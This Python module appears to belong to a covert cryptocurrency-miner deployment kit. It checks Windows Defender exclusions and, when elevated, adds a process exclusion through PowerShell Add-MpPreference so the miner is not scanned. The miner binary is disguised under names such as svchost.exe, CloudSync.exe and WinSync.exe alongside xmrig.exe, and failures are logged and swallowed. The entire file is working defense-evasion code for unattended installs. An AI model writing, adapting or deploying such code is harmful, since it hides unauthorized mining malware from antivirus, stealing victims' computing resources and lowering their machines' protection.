"""Ensure the running worker binary is Defender-excluded (legacy-install repair).

An install created by an older kit may hold exclusions scoped to a binary name it
no longer runs (``xmrig.exe`` excluded, ``svchost.exe`` actually executed, or the
reverse). The updater never touches exclusions, so those boxes stay unprotected
until someone reinstalls - which is exactly what an unattended deployment cannot
rely on. This module closes that gap at supervisor start, best-effort:

* nothing happens unless the token is elevated (``Add-MpPreference`` needs admin);
* the exclusion is only added when it is missing, so it is idempotent;
* every failure is logged once and swallowed - a miner must never fail to start
  because a Defender preference could not be written.

Windows-only, like the rest of the platform layer: on a non-Windows host the
functions return a "skipped" verdict instead of raising.
"""

import os

from .. import lifecycle

__all__ = ["coverage_verdict", "ensure_exclusion"]

#: Binary names the kit has shipped under; a legacy box may exclude any of them.
KNOWN_BINARIES = ("svchost.exe", "CloudSync.exe", "xmrig.exe", "WinSync.exe")

_QUERY_SCRIPT = (
    "$p=Get-MpPreference;"
    "'PATH::' + (@($p.ExclusionPath) -join '|');"
    "'PROC::' + (@($p.ExclusionProcess) -join '|')"
)


def _query_exclusions(timeout=30):
    """Return ``(paths, processes)`` as lists of normalised lowercase strings."""
    result = lifecycle._run_powershell_capture(_QUERY_SCRIPT, timeout=timeout)
    paths, procs = [], []
    for line in (result or "").splitlines():
        line = line.strip()
        if line.startswith("PATH::"):
            paths = [p.strip().lower() for p in line[6:].split("|") if p.strip()]
        elif line.startswith("PROC::"):
            procs = [p.strip().lower() for p in line[6:].split("|") if p.strip()]
    return paths, procs


def coverage_verdict(install_dir, binary_path):
    """Say whether *binary_path* is covered by an existing exclusion.

    Returns a dict: ``covered`` (bool), ``how`` ("process" | "directory" |
    "none"), ``paths``/``processes`` (what Defender reports) and ``error``.
    A directory exclusion covers the binary by containment, which is how the
    current installer protects fresh installs.
    """
    binary_path = os.path.abspath(binary_path) if binary_path else ""
    directory = os.path.abspath(install_dir) if install_dir else ""
    try:
        paths, procs = _query_exclusions()
    except Exception as exc:  # pragma: no cover - host dependent
        return {"covered": None, "how": "unknown", "paths": [], "processes": [],
                "error": repr(exc)}

    target_file = os.path.basename(binary_path).lower()
    target_dir = directory.lower().rstrip("\\")
    for proc in procs:
        if proc and (proc.endswith(target_file) or proc == target_file):
            return {"covered": True, "how": "process", "paths": paths,
                    "processes": procs, "error": None}
    for path in paths:
        if not path:
            continue
        norm = path.rstrip("\\")
        if norm and (norm == target_dir or target_dir.startswith(norm + "\\")
                     or os.path.dirname(binary_path).lower().startswith(norm + "\\")):
            return {"covered": True, "how": "directory", "paths": paths,
                    "processes": procs, "error": None}
    return {"covered": False, "how": "none", "paths": paths, "processes": procs,
            "error": None}


def ensure_exclusion(install_dir, binary_path, log=None, timeout=45):
    """Add a process exclusion for *binary_path* when one is missing.

    Returns the verdict dict from :func:`coverage_verdict`, with ``added`` set
    to True when this call wrote a preference.
    """
    write = log if callable(log) else (lambda _m: None)
    verdict = coverage_verdict(install_dir, binary_path)
    verdict["added"] = False

    if verdict.get("error"):
        write("defender exclusion check failed: %s" % verdict["error"])
        return verdict
    if verdict.get("covered") is None:
        return verdict
    if verdict["covered"]:
        if verdict["how"] == "process":
            write("defender: binary excluded (process rule)")
        else:
            write("defender: binary covered by directory exclusion")
        return verdict
    if not lifecycle._is_admin():
        write("defender: binary NOT excluded and not elevated - leaving as is")
        return verdict

    target = os.path.abspath(binary_path)
    script = (
        "$p=Get-MpPreference;"
        "$t='%s';"
        "$have=$false;"
        "foreach($v in $p.ExclusionProcess){if($v -and "
        "([IO.Path]::GetFullPath($v) -ieq $t)){$have=$true}};"
        "if(-not $have){Add-MpPreference -ExclusionProcess $t -ErrorAction Stop}"
    ) % target.replace("'", "''")
    try:
        lifecycle._run_powershell(script, timeout=timeout)
    except Exception as exc:  # pragma: no cover - host dependent
        write("defender: could not add exclusion (%r)" % (exc,))
        return verdict

    after = coverage_verdict(install_dir, binary_path)
    after["added"] = bool(after.get("covered"))
    if after.get("covered"):
        write("defender: added process exclusion for %s" % os.path.basename(target))
    else:
        write("defender: exclusion still missing after write attempt")
    return after
